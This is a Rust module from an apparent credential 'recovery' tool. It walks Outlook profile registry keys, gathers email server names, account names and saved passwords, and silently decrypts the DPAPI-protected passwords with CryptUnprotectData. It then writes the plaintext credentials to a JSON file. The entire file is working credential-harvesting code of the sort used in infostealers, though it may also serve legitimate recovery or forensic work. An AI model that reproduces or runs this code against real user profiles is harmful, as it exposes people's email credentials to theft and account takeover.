use crate::recovery::context::RecoveryContext;
use crate::recovery::output::write_json_artifact;
use crate::recovery::registry::format_reg_value;
use crate::recovery::task::{RecoveryArtifact, RecoveryCategory, RecoveryError, RecoveryTask};
use async_trait::async_trait;
use serde::Serialize;
use std::ffi::c_void;
use std::sync::Arc;
use windows::Win32::Foundation::{HLOCAL, LocalFree};
use windows::Win32::Security::Cryptography::{
    CRYPT_INTEGER_BLOB, CRYPTPROTECT_UI_FORBIDDEN, CryptUnprotectData,
};
use winreg::enums::HKEY_CURRENT_USER;
use winreg::{RegKey, RegValue};

pub fn outlook_registry_task() -> Arc<dyn RecoveryTask> {
    Arc::new(OutlookRegistryTask)
}

pub struct OutlookRegistryTask;

impl OutlookRegistryTask {
    fn collect_entries() -> Vec<RegistryEntry> {
        const OUTLOOK_PATHS: &[&str] = &[
            r"Software\Microsoft\Office\15.0\Outlook\Profiles\Outlook\9375CFF0413111d3B88A00104B2A6676",
            r"Software\Microsoft\Office\16.0\Outlook\Profiles\Outlook\9375CFF0413111d3B88A00104B2A6676",
            r"Software\Microsoft\Windows NT\CurrentVersion\Windows Messaging Subsystem\Profiles\Outlook\9375CFF0413111d3B88A00104B2A6676",
            r"Software\Microsoft\Windows Messaging Subsystem\Profiles\9375CFF0413111d3B88A00104B2A6676",
        ];

        const MAIL_CLIENTS: &[&str] = &[
            "SMTP Email Address",
            "SMTP Server",
            "POP3 Server",
            "POP3 User Name",
            "SMTP User Name",
            "NNTP Email Address",
            "NNTP User Name",
            "NNTP Server",
            "IMAP Server",
            "IMAP User Name",
            "Email",
            "HTTP User",
            "HTTP Server URL",
            "POP3 User",
            "IMAP User",
            "HTTPMail User Name",
            "HTTPMail Server",
            "SMTP User",
            "POP3 Password2",
            "IMAP Password2",
            "NNTP Password2",
            "HTTPMail Password2",
            "SMTP Password2",
            "POP3 Password",
            "IMAP Password",
            "NNTP Password",
            "HTTPMail Password",
            "SMTP Password",
        ];

        let hive = RegKey::predef(HKEY_CURRENT_USER);
        let mut entries = Vec::new();

        for path in OUTLOOK_PATHS {
            if let Ok(key) = hive.open_subkey(path) {
                OutlookRegistryTask::walk_registry(&key, path, MAIL_CLIENTS, &mut entries);
            }
        }

        entries
    }

    fn walk_registry(key: &RegKey, path: &str, names: &[&str], entries: &mut Vec<RegistryEntry>) {
        for name in names {
            if let Ok(value) = key.get_raw_value(name) {
                entries.push(RegistryEntry {
                    path: path.to_string(),
                    name: name.to_string(),
                    value: format_outlook_registry_value(name, &value),
                });
            }
        }

        let mut iter = key.enum_keys();
        while let Some(Ok(sub_name)) = iter.next() {
            if let Ok(child) = key.open_subkey(&sub_name) {
                let child_path = format!(r"{path}\{sub_name}");
                OutlookRegistryTask::walk_registry(&child, &child_path, names, entries);
            }
        }
    }
}

fn format_outlook_registry_value(name: &str, value: &RegValue) -> String {
    if name.contains("Password") && !name.contains('2') {
        if let Ok(decrypted) = decode_dpapi_value(&value.bytes) {
            if let Ok(text) = String::from_utf8(decrypted) {
                let trimmed = text.trim_end_matches('\0').to_string();
                if !trimmed.is_empty() {
                    return trimmed;
                }
            }
        }
    }
    format_reg_value(value)
}

fn decode_dpapi_value(encrypted: &[u8]) -> Result<Vec<u8>, RecoveryError> {
    unsafe {
        let mut input = CRYPT_INTEGER_BLOB {
            cbData: encrypted.len() as u32,
            pbData: encrypted.as_ptr() as *mut u8,
        };
        let mut output = CRYPT_INTEGER_BLOB::default();

        let success = CryptUnprotectData(
            &mut input,
            None,
            None,
            None,
            None,
            CRYPTPROTECT_UI_FORBIDDEN,
            &mut output,
        );

        if success.is_err() {
            return Err(RecoveryError::Custom("CryptUnprotectData failed".into()));
        }

        let slice = std::slice::from_raw_parts(output.pbData, output.cbData as usize);
        let result = slice.to_vec();
        if !output.pbData.is_null() {
            let _ = LocalFree(HLOCAL(output.pbData as *mut c_void));
        }

        Ok(result)
    }
}

#[derive(Serialize)]
struct RegistryEntry {
    path: String,
    name: String,
    value: String,
}

#[async_trait]
impl RecoveryTask for OutlookRegistryTask {
    fn label(&self) -> String {
        "Outlook Registry".to_string()
    }

    fn category(&self) -> RecoveryCategory {
        RecoveryCategory::EmailClients
    }

    async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
        let summary = OutlookRegistrySummary {
            entries: OutlookRegistryTask::collect_entries(),
        };
        let artifact = write_json_artifact(
            ctx,
            self.category(),
            &self.label(),
            "outlook-registry.json",
            &summary,
        )
        .await?;

        Ok(vec![artifact])
    }
}

#[derive(Serialize)]
struct OutlookRegistrySummary {
    entries: Vec<RegistryEntry>,
}
